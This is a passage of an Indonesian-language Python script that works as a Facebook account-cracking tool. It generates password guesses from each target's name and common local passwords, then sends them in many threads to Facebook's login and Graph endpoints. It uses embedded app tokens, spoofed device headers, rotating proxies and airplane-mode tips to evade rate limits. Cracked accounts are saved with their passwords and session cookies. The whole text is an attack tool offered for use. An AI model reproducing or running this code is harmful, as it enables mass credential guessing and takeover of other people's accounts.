        except:
            continue
        num = f"{idx:02}"
        file_map[str(idx)] = file
        file_map[num] = file
        console.print(Panel(f"{P2}[{color_text}{num}{P2}] {file} {K2}{jumlah} Account", width=60, style=color_panel))

    pilih_file(file_map, folder, warna_akun)

def pilih_file(file_map, folder, warna_akun):
    pilihan = console.input(f" {H2}• {P2}Masukan : ").strip()
    
    if pilihan not in file_map:
        console.print(f" {H2}• {P2}Pilih Yang Bener Atuhh")
        exit()
    
    file_path = f"{folder}/{file_map[pilihan]}"
    
    try:
        with open(file_path, "r") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        console.print(f" {H2}• {P2}File Tidak Ditemukan")
        time.sleep(3)
        exit()
    
    for line in lines:
        data = line.split("|")
        
        if len(data) == 3:
            user, password, cookie = data
            console.print(Panel(f" ID : {user} PASSWORD : {password} | COOKIE : {cookie}", width=60, style=warna_akun))
        elif len(data) == 2:
            id, pw = data
            console.print(Panel(f" ID : {id} PASSWORD : {pw}", width=60, style=warna_akun))
        else:
            console.print(f" {H2}• {P2}Format data tidak valid: {line}")
    
    console.input(f" {H2}• {P2}[ {M2}Klik Enter Untuk Keluar {P2}]")
    exit()

def convert(cookie):
    cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
        cookie["fr"],
        cookie["datr"],
        cookie["c_user"],
        cookie["xs"],
    )
    return str(cok)

def tahun(fx):
    if len(fx) == 15:
        # Untuk ID dengan panjang 15 dan awalan "1000000000" hingga "100000000"
        if fx[:10] == "1000000000":
            tahunz = "2009"
        elif fx[:9] == "100000000":
            tahunz = "2009"
        # ID lebih panjang yang diawali dengan 10000000 (2009)
        elif fx[:8] == "10000000":
            tahunz = "2009"
        # ID yang lebih baru antara 1000000 hingga 1000009 untuk 2009-2010
        elif fx[:7] in ["1000000", "1000001", "1000002", "1000003", "1000004", "1000005"]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] == "100001":
            tahunz = "2010"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011"
        elif fx[:6] == "100004":
            tahunz = "2012"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014"
        elif fx[:6] == "100009":
            tahunz = "2015"
        elif fx[:5] == "10001":
            tahunz = "2016"
        elif fx[:5] == "10002":
            tahunz = "2017"
        elif fx[:5] == "10003":
            tahunz = "2018"
        elif fx[:5] == "10004":
            tahunz = "2019"
        elif fx[:5] == "10005":
            tahunz = "2020"
        elif fx[:5] == "10006":
            tahunz = "2021"
        elif fx[:5] == "10009":
            tahunz = "2023"
        elif fx[:5] in ["10007", "10008"]:
            tahunz = "2022"
        
        # Tambahan untuk ID yang dimulai dengan "6"
        elif fx[:10] == "6155383519":
            tahunz = "2015"
        elif fx[:9] == "615538351":
            tahunz = "2015"
        elif fx[:8] == "61553835":
            tahunz = "2015"
        elif fx[:7] == "6155383":
            tahunz = "2015"
        elif fx[:6] == "615538":
            tahunz = "2015"
        elif fx[:6] == "615565":
            tahunz = "2016"
        elif fx[:6] == "615566":
            tahunz = "2016"
        elif fx[:6] == "615567":
            tahunz = "2017"
        elif fx[:6] == "615568":
            tahunz = "2017"
        elif fx[:6] == "615569":
            tahunz = "2018"
        elif fx[:6] == "615570":
            tahunz = "2018"
        else:
            tahunz = ""
    
    elif len(fx) in [9, 10]:
        # ID dengan panjang 9 atau 10 kemungkinan besar dibuat sekitar 2008
        tahunz = "2008"
    elif len(fx) == 8:
        # ID dengan panjang 8 mungkin dibuat sekitar 2007
        tahunz = "2007"
    elif len(fx) == 7:
        # ID dengan panjang 7 kemungkinan besar dibuat sekitar 2006
        tahunz = "2006"
    else:
        tahunz = ""  # ID dengan panjang lainnya tidak diketahui

    return tahunz


# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    # Validasi variabel global
    global id, id2, method, ualuh, ualu

    # Validasi jika daftar ID kosong
    if not id or not isinstance(id, list):
        console.print(f" {H2}• [bold red]Error:[/bold red] Daftar ID tidak ditemukan atau kosong!")
        return

    # Pilihan metode crack
    Console().print(Panel(
        f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n"
        f"{P2}[{color_text}02{P2}] Crack akun New [/]\n"
        f"{P2}[{color_text}03{P2}] Crack akun Random [[bold green]Recommended[bold white]][/]",
        title=f"[bold green] {len(id)} Akun Tersedia",
        width=60,
        style=f"{color_panel}"
    ))
    
    # Input untuk metode crack
    hu = console.input(f" {H2}• {P2}Masukan : ").strip()
    if hu in ["1", "01"]:
        for tua in sorted(id):  # Urutkan dari lama ke baru
            id2.append(tua)
    elif hu in ["2", "02"]:
        muda = sorted(id)
        id2.extend(muda[::-1])  # Urutkan dari baru ke lama
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)  # Masukkan secara acak
    else:
        console.print(f" {H2}• {P2}Pilih Yg bener etdahh, coba lagi.")
        return setting()  # Rekursi untuk mengulang input
    Console().print(Panel(f'{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]b-graph.facebook.com[bold white] [/]', width=60, style=f'{color_panel}', title='[bold green] Method'))
    fankylog = console.input(f' {H2}• {P2}Masukan : ').strip()
    if fankylog in ['1', '01']:
        method.append('fankygraph')
    elif fankylog in ['2', '02']:
        method.append('fankybapi')
    else:
        method.append('fankybapi')
    Console().print(Panel('[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T', title='[bold green]Setting User-Agent', width=60, style=f'{color_panel}'))
    uatambah = console.input(f' {H2}• {P2}Masukan : ').strip()
    if uatambah.lower() in ['y', 'ya']:
        ualuh.append('ya')
        bzer = console.input(f' {H2}• {P2}Masukan UA : ').strip()
        ualu.append(bzer)
    else:
        ualuh.append('tidak')
    Console().print(Panel(f'{P2}[{color_text}01{P2}] Metode Slow {P2}\n{P2}[{color_text}02{P2}] Metode Cepat {P2}[{H2}Recommended{P2}]{P2}', width=60, style=f'{color_panel}'))
    hc = console.input(f' {H2}• {P2}Masukan : ').strip()
    if hc in ['1', '01']:
        metslow()
    elif hc in ['2', '02']:
        metcepat()
    else:
        metcepat()

def metslow():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print('')
    urut = []
    urut.append(panel('[bold green]%s [bold white]' % okc, width=29, title='[bold green]OK SAVE', style=f'{color_panel}'))
    urut.append(panel('[bold yellow]%s [bold white]' % cpc, width=30, title='[bold yellow]CP SAVE', style=f'{color_panel}'))
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(Panel('[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ', title='[bold yellow]Crack cepat', width=60, style=f'{color_panel}'))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('', total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = (yuzong.split('|')[0], yuzong.split('|')[1].lower())
                frs = nmf.split(' ')[0]
                pwv = ['indonesia123', 'bismillah123', 'sayangku123']
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + '321')
                        pwv.append(frs + '2000')
                        pwv.append(frs + '2001')
                        pwv.append(frs + '2002')
                        pwv.append(frs + '2003')
                        pwv.append(frs + '2004')
                        pwv.append(frs + '2005')
                        pwv.append(frs + '2006')
                        pwv.append(frs + '2007')
                        pwv.append(frs + '2008')
                        pwv.append(frs + '2010')
                        pwv.append(frs + '2009')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                        pwv.append(frs + '01')
                        pwv.append(frs + '02')
                        pwv.append(frs + '03')
                        pwv.append(frs + '04')
                        pwv.append(frs + '05')
                        pwv.append(frs + '06')
                        pwv.append(frs + '21')
                        pwv.append(frs + '22')
                        pwv.append(frs + '23')
                        pwv.append(frs + '11')
                        pwv.append(frs + '12')
                        pwv.append('bismillah')
                        pwv.append('bismillah123')
                        pwv.append('sayang')
                        pwv.append('sayang123')
                        pwv.append('sayangku')
                        pwv.append('kata sandi')
                        pwv.append('katasandi')
                        pwv.append('indonesia')
                        pwv.append('kontol')
                        pwv.append('kontol123')
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + '321')
                        pwv.append(frs + '2000')
                        pwv.append(frs + '2001')
                        pwv.append(frs + '2002')
                        pwv.append(frs + '2003')
                        pwv.append(frs + '2004')
                        pwv.append(frs + '2005')
                        pwv.append(frs + '2006')
                        pwv.append(frs + '2007')
                        pwv.append(frs + '2008')
                        pwv.append(frs + '2010')
                        pwv.append(frs + '2009')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                        pwv.append(frs + '1234567')
                        pwv.append(frs + '01')
                        pwv.append(frs + '02')
                        pwv.append(frs + '03')
                        pwv.append(frs + '04')
                        pwv.append(frs + '05')
                        pwv.append(frs + '06')
                        pwv.append(frs + '21')
                        pwv.append(frs + '22')
                        pwv.append(frs + '23')
                        pwv.append(frs + '11')
                        pwv.append(frs + '12')
                        pwv.append('bismillah')
                        pwv.append('bismillah123')
                        pwv.append('sayang')
                        pwv.append('sayang123')
                        pwv.append('sayangku')
                        pwv.append('kata sandi')
                        pwv.append('katasandi')
                        pwv.append('indonesia')
                        pwv.append('kontol')
                        pwv.append('kontol123')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'fankygraph' in method:
                    pool.submit(fankygraphv1, idf, pwv, 'graph.facebook.com')
                elif 'fankybapi' in method:
                    pool.submit(fanb_graph, idf, pwv)
                else:
                    pool.submit(fanb_graph, idf, pwv)
    print('')
    Console().print(Panel('[bold green]Crack Telah Selesai ngap', subtitle='╭───', subtitle_align='left', title='[bold green]INFO', width=60, style=f'{color_panel}'))
    Console().print(f'[bold cyan]   ╰[bold green] OK ─> {ok}\t[bold yellow]CP ─> {cp}')
    print('')

def metcepat():
    global des  # inserted
    global prog  # inserted
    bi = random.choice([u, k, kk, b, h, hh])
    print('')
    urut = []
    urut.append(panel('[bold green]%s [bold white]' % okc, width=29, title='[bold green]OK SAVE', style=f'{color_panel}'))
    urut.append(panel('[bold yellow]%s [bold white]' % cpc, width=30, title='[bold yellow]CP SAVE', style=f'{color_panel}'))
    wa.print(Columns(urut))
    awal = datetime.datetime.now()
    Console().print(Panel('[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ', title='[bold yellow]Crack cepat', width=60, style=f'{color_panel}'))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('', total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = (yuzong.split('|')[0], yuzong.split('|')[1].lower())
                frs = nmf.split(' ')[0]
                pwv = ['bismillah123', 'sayangku123', 'indonesia123']
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + '321')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + '321')
                        pwv.append(frs + '123')
                        pwv.append(frs + '1234')
                        pwv.append(frs + '12345')
                        pwv.append(frs + '123456')
                if 'ya' in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if 'fankygraph' in method:
                    pool.submit(fankygraphv1, idf, pwv, 'graph.facebook.com')
                elif 'fankybapi' in method:
                    pool.submit(fanb_graph, idf, pwv)
                else:
                    pool.submit(fanb_graph, idf, pwv)
    print('')
    Console().print(Panel('[bold green]Crack Telah Selesai ngap', subtitle='╭───', subtitle_align='left', title='[bold green]INFO', width=60, style=f'{color_panel}'))
    Console().print(f'[bold cyan]   ╰[bold green] OK ─> {ok}\t[bold yellow]CP ─> {cp}')
    print('')

def fanb_graph(idf, pwv):
    global loop, ok, cp
    rr = random.randint
    rc = random.choice
    bo = random.choice([m, k, h, b, u, x])
    ua = random.choice(ugen)
    ses = requests.Session()
    prog.update(des, description=f' {K2}•{H2} Method B-graph {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]')
    prog.advance(des)
    for pw in pwv:
        try:
            if 'ya' in ualuh:
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            head = {
                'Host': 'b-graph.facebook.com',
				'X-Fb-Connection-Quality': 'EXCELLENT',
				'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
				'User-Agent': ua,
				'X-Tigon-Is-Retry': 'false',
				'X-Fb-Friendly-Name': 'authenticate',
				'X-Fb-Connection-Bandwidth': str(random.randrange(70000000, 80000000)),
				'Zero-Rated': '0',
				'X-Fb-Net-Hni': str(random.randrange(50000, 60000)),
				'X-Fb-Sim-Hni': str(random.randrange(50000, 60000)),
				'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
				'Content-Type': 'application/x-www-form-urlencoded',
				'X-Fb-Connection-Type': 'WIFI',
				'X-Fb-Device-Group': str(random.randrange(4700, 5000)),
				'Priority': 'u=3,i',
				'Accept-Encoding': 'gzip, deflate',
				'X-Fb-Http-Engine': 'Liger',
				'X-Fb-Client-Ip': 'true',
				'X-Fb-Server-Cluster': 'true',
				'Content-Length': str(random.randrange(1500, 2000))
			}
            data = {
				'adid': str(uuid.uuid4()),
				'format': 'json',
				'device_id': str(uuid.uuid4()),
				'email': idf,
				'password': '#PWD_FB4A:0:{}:{}'.format(str(time.time())[:10], pw),
				'generate_analytics_claim': '1',
				'community_id': '',
				'linked_guest_account_userid': '',
				'cpl': True,
				'try_num': '1',
				'family_device_id': str(uuid.uuid4()),
				'secure_family_device_id': str(uuid.uuid4()),
				'credentials_type': 'password',
				'account_switcher_uids': [],
				'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
				'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
				'enroll_misauth': False,
				'generate_session_cookies': '1',
				'error_detail_type': 'button_with_disabled',
				'source': 'login',
				'machine_id': ''.join([
					random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
					for i in range(24)
				]),
				'jazoest': str(random.randrange(22000, 23000)),
				'meta_inf_fbmeta': 'V2_UNTAGGED',
				'advertiser_id': str(uuid.uuid4()),
				'encrypted_msisdn': '',
				'currently_logged_in_userid': '0',
				'locale': 'id_ID',
				'client_country_code': 'ID',
				'fb_api_req_friendly_name': 'authenticate',
				'fb_api_caller_class': 'Fb4aAuthHandler',
				'api_key': '882a8490361da98702bf97a021ddc14d',
				'sig': hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32],
				'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			}
            pos = ses.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
            if 'User must verify their account on www.facebook.com' in str(pos):
                cp += 1
                tree = Tree(Panel.fit(f'{K2}  AKUN CHECKPOINT{P2}', style=f'{color_panel}'), guide_style='bold grey100')
                tree.add(Panel.fit(f'{K2}{idf} | {pw}{P2}', style=f'{color_panel}'))
                tree.add(Panel.fit(f'{K2}{tahun(idf)}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{M2}{ua}{P2}', style=f'{color_panel}'))
                prints(tree)
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                break
            elif 'session_key' in str(pos) and 'access_token' in str(pos):
                ok += 1
                uid = pos['uid']
                token = pos['access_token']
                cookie = ''.join(['{}={};'.format(i['name'], i['value']) for i in pos['session_cookies']])
                tree = Tree(Panel.fit(f'{H2}  AKUN SUKSES {P2}', style=f'{color_panel}'), guide_style='bold grey100')
                tree.add(Panel.fit(f'{H2}{uid} | {pw}{P2}', style=f'{color_panel}'))
                tree.add(Panel.fit(f'{H2}{tahun(idf)}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{U2}{ua}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{U2}{kuki}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{U2}{token}{P2}', style=f'{color_panel}'))
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def fankygraphv1(idf, pwv, url):
    global loop, ok, cp
    bo = random.choice([m, k, h, b, u, x])
    rr = random.randint
    rc = random.choice
    ses = requests.Session()
    prog.update(des, description=f' {K2}•{H2} Method Graph {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]')
    prog.advance(des)
    ua = random.choice(ugen)
    for pw in pwv:
        try:
            if 'ya' in ualuh:
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            params = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16', 'sdk_version': random.randint(1, 26), 'email': idf, 'locale': 'zh_CN', 'password': pw, 'sdk': 'Android', 'generate_session_cookies': '1', 'sig': '4f648f21fb58fcd2aa1c65f35f441ef5'}
            headers = {'Host': url, 'x-fb-sim-hni': str(random.randint(100000, 300000)), 'x-fb-net-hni': str(random.randint(100000, 300000)), 'x-fb-connection-quality': 'EXCELLENT', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-device-group': f'{str(random.randint(1000, 4000))}', 'x-fb-friendly-name': 'RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery', 'x-fb-request-analytics-tags': 'unknown', 'accept-encoding': 'gzip, deflate', 'x-fb-http-engine': 'Liger', 'connection': 'close'}
            post = ses.post(f'https://{url}/auth/login?locale=zh_CN', params=params, headers=headers, allow_redirects=False, proxies=proxs)
            if 'User must verify their account' in post.text:
                cp += 1
                tree = Tree(Panel.fit(f'{K2}  AKUN CHECKPOINT{P2}', style=f'{color_panel}'), guide_style='bold grey100')
                tree.add(Panel.fit(f'{K2}{idf} | {pw}{P2}', style=f'{color_panel}'))
                tree.add(Panel.fit(f'{K2}{tahun(idf)}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{M2}{ua}{P2}', style=f'{color_panel}'))
                prints(tree)
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                break
            elif 'session_key' in post.text and 'EAA' in post.text:
                ok += 1
                kuki = ';'.join((i['name'] + '=' + i['value'] for i in post.json()['session_cookies']))
                user = re.findall('c_user=(.*?)', kuki)[0]
                tree = Tree(Panel.fit(f'{H2}  AKUN SUKSES {P2}', style=f'{color_panel}'), guide_style='bold grey100')
                tree.add(Panel.fit(f'{H2}{idf} | {pw}{P2}', style=f'{color_panel}'))
                tree.add(Panel.fit(f'{H2}{tahun(idf)}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{U2}{ua}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{U2}{kuki}{P2}', style=f'{color_panel}'))
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                break
            elif 'Calls to this api have exceeded the rate limit. (613)' in post.text:
                prog.update(des, description=f' {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]', end='')
                prog.advance(des)
                time.sleep(10)
                # break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

def fanky_b_api(idf, pwv):
    global loop  # inserted
    global ok  # inserted
    global cp  # inserted
    rr = random.randint
    rc = random.choice
    bo = random.choice([m, k, h, b, u, x])
    ua = random.choice(ugen)
    ses = requests.Session()
    prog.update(des, description=f' {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]')
    prog.advance(des)
    for pw in pwv:
        try:
            if 'ya' in ualuh:
                ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
            data = {
                'lsd': re.search('name="lsd" value="(.*?)"', requ.text).group(1), 
                'jazoest': re.search('name="jazoest" value="(.*?)"', requ.text).group(1), 
                'm_ts': re.search('name="m_ts" value="(.*?)"', requ.text).group(1), 
                'li': re.search('name="li" value="(.*?)"', requ.text).group(1), 
                'try_number': '0', 
                'unrecognized_tries': '0', 
                'prefill_contact_point': idf, 
                'prefill_source': 'provided_or_soft_matched', 
                'first_prefill_source': 'provided_or_soft_matched', 
                'first_prefill_type': 'contact_point', 
                'had_cp_prefilled': 'true', 
                'had_password_prefilled': 'false', 
                'is_smart_lock': 'false', 
                '_fb_noscript': 'true', 
                'email': idf, 
                'pass': pw
            }
            head = {
                'User-Agent': ua, 
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 
                'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
                'Accept-Encoding': 'gzip, deflate, br', 
                'Connection': 'keep-alive', 
                'Referer': 'https://iphone.facebook.com/', 
                'Origin': 'https://iphone.facebook.com', 
                'Upgrade-Insecure-Requests': '1', 
                'Sec-Fetch-Dest': 'document', 
                'Sec-Fetch-Mode': 'navigate', 
                'Sec-Fetch-Site': 'same-origin', 
                'Sec-Fetch-User': '?1', 
                'DNT': '1'}
            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
            if 'checkpoint' in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f'{K2}  AKUN CHECKPOINT{P2}', style=f'{color_panel}'), guide_style='bold grey100')
                tree.add(Panel.fit(f'{K2}{idf} | {pw}{P2}', style=f'{color_panel}'))
                tree.add(Panel.fit(f'{K2}{tahun(idf)}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{M2}{ua}{P2}', style=f'{color_panel}'))
                prints(tree)
                open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            elif 'c_user' in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = 'datr=' + coki['datr'] + ';' + 'sb=' + coki['sb'] + ';' + 'locale=id_ID' + ';' + 'c_user=' + coki['c_user'] + ';' + 'xs=' + coki['xs'] + ';' + 'fr=' + coki['fr'] + ';'
                tree = Tree(Panel.fit(f'{H2}  AKUN SUKSES {P2}', style=f'{color_panel}'), guide_style='bold grey100')
                tree.add(Panel.fit(f'{H2}{idf} | {pw}{P2}', style=f'{color_panel}'))
                tree.add(Panel.fit(f'{H2}{tahun(idf)}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{U2}{ua}{P2}', style=f'{color_panel}'))
                tree.add(Panel(f'{U2}{kuki}{P2}', style=f'{color_panel}'))
                prints(tree)
                open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

if __name__ == '__main__':
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.system("touch .prox.txt")
    except:
        pass
    try:
        clear()
    except:
        pass
    login()
